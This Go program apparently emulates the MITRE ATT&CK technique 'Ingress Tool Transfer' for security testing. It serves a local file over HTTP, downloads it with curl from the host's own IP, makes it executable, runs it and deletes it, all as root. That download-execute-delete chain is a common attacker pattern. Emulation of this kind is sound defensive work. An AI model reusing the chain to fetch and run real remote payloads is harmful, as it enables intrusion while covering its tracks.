package main

import (
	"fmt"
	"net/http"
	"os"
	"os/exec"
	"path/filepath"
	"script/pkg/system"
	"script/pkg/tags"
)

var (
	port     = "54340"
	fileName = "myapp"
)

func main() {
	filePath := filepath.Join("assets", fileName)
	ip := system.GetOutboundIP()
	url := fmt.Sprintf("http://%s:%s/payload", ip, port)

	if !system.IsRoot() {
		fmt.Printf("%sThe script must be run using root permissions\n", tags.Err)
		return
	}
	fmt.Printf("%sT1105 Ingress Tool Transfer\n", tags.Info)
	go func() {
		err := webServer(port, filePath)
		if err != nil {
			fmt.Printf("%s%s\n", tags.Err, err.Error())
		}
	}()

	err := getRequestToRetrieveFile(url, fileName)
	if err != nil {
		fmt.Printf("%s%s\n", tags.Err, err.Error())
		return
	}

	makeFileExecutable(fileName)

	launchFile(fileName)

	deleteFile(fileName)
}

func webServer(port string, filePath string) error {
	http.HandleFunc("/payload", func(w http.ResponseWriter, r *http.Request) {
		file, err := os.Open(filePath)
		if err != nil {
			http.Error(w, "File not found\n", http.StatusNotFound)
			fmt.Printf("%sError opening file: %v\n", tags.Err, err)
			return
		}
		defer file.Close()

		w.Header().Set("Content-Disposition", "attachment; filename=\"myapp\"")
		w.Header().Set("Content-Type", "application/octet-stream")

		http.ServeFile(w, r, filePath)
	})

	fmt.Printf("%sServer is running at http://localhost:%s\n", tags.Log, port)
	err := http.ListenAndServe(":"+port, nil)
	if err != nil {
		return err
	}

	return nil
}

func getRequestToRetrieveFile(url string, fileName string) error {
	err := exec.Command("curl", "-X", "GET", url, "-o", fileName).Run()
	if err != nil {
		return err
	}

	return nil
}

func makeFileExecutable(filePath string) {
	err := exec.Command("chmod", "+x", filePath).Run()
	if err != nil {
		fmt.Printf("%sError when changing access rights for %s: %s\n", tags.Log, filePath, err.Error())
	}
}

func launchFile(filePath string) error {
	out, err := exec.Command("./" + filePath).Output()
	if err != nil {
		return err
	}
	fmt.Printf("%sThe %s file is running\n", tags.Log, fileName)
	fmt.Print(string(out))
	return nil
}

func deleteFile(filePath string) {
	err := os.Remove(fileName)
	if err != nil {
		fmt.Printf("%sError when deleting file %s: %s\n", tags.Err, filePath, err.Error())
	} else {
		fmt.Printf("%sFile %s deleted\n", tags.Info, fileName)
	}
}
